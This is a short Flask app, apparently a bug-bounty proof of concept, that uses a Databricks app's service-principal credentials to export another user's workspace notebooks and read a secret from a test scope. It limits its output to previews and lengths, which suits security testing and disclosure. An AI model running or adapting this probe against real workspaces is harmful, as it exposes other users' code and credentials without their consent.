import os
from databricks.sdk import WorkspaceClient
from flask import Flask, jsonify
app = Flask(__name__)

@app.route("/")
def home():
    return "h3-app ok"

@app.route("/probe5")
def probe5():
    w = WorkspaceClient()
    out = {}
    def do(method, path, query=None):
        try:
            return True, w.api_client.do("GET", path, query=query)
        except Exception as e:
            return False, repr(e)[:220]
    # 1. own private notebook
    ok, d = do("GET", "/api/2.0/workspace/export",
               {"path": "/Users/m4tr1x4g3nt47+user1@wearehackerone.com/h3_priv_nb", "format": "SOURCE"})
    if ok and isinstance(d, dict):
        raw = d.get("content", "")
        try:
            import base64 as b
            txt = b.b64decode(raw).decode("utf-8", "replace")
        except Exception:
            txt = str(raw)
        out["own_read"] = {"ok": True, "marker": "H3-APPSP-READ" in txt, "len": len(txt)}
    else:
        out["own_read"] = {"ok": False, "err": d}
    # 2. other user listing + read
    ok, d = do("GET", "/api/2.0/workspace/list",
               {"path": "/Users/ram_rattle+user1@wearehackerone.com"})
    if ok and isinstance(d, dict):
        objs = d.get("objects", [])
        out["other_list"] = [o.get("path") for o in objs][:8]
        target = None
        for o in objs:
            if o.get("object_type") in ("NOTEBOOK", "FILE"):
                target = o.get("path")
                break
        if not target and objs:
            ok2, d2 = do("GET", "/api/2.0/workspace/list", {"path": objs[0].get("path")})
            if ok2 and isinstance(d2, dict):
                sub = d2.get("objects", [])
                out["other_sub"] = [o.get("path") for o in sub][:8]
                for o in sub:
                    if o.get("object_type") in ("NOTEBOOK", "FILE"):
                        target = o.get("path")
                        break
        if target:
            ok3, d3 = do("GET", "/api/2.0/workspace/export", {"path": target, "format": "SOURCE"})
            if ok3 and isinstance(d3, dict):
                raw = d3.get("content", "")
                try:
                    import base64 as b
                    txt = b.b64decode(raw).decode("utf-8", "replace")
                except Exception:
                    txt = str(raw)
                out["other_read"] = {"path": target, "read_ok": True, "len": len(txt),
                                     "preview": " ".join(txt.split())[:100]}
            else:
                out["other_read"] = {"ok": False, "err": d3}
    # 3. secret reach (length only)
    ok, d = do("GET", "/api/2.0/secrets/list", {"scope": "h1_test"})
    if ok and isinstance(d, dict):
        keys = [s.get("key") for s in d.get("secrets", [])][:8]
        out["h1_test_keys"] = keys
        if keys:
            ok4, d4 = do("GET", "/api/2.0/secrets/get", {"scope": "h1_test", "key": keys[0]})
            if ok4 and isinstance(d4, dict):
                val = d4.get("value", "")
                out["secret_read"] = {"ok": True, "value_len": len(val)}
            else:
                out["secret_read"] = {"ok": False, "err": d4}
    return jsonify(out)
